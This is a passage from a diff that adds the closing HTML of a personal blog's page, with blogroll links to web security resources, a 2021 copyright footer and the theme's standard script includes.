+          <a href="https://www.ddosi.org/" title="https:&#x2F;&#x2F;www.ddosi.org&#x2F;" rel="noopener" target="_blank">雨苁</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://websec.readthedocs.io/" title="https:&#x2F;&#x2F;websec.readthedocs.io&#x2F;" rel="noopener" target="_blank">WEB安全学习笔记</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">longer</span>
+</div>
+  <div class="powered-by">由 <a href="https://gitee.com/cat-nineteen/blog/raw/master/imgs/guanzhu.png" class="theme-link" rel="noopener" target="_blank">cat-nineteen</a> @ <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">longer</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
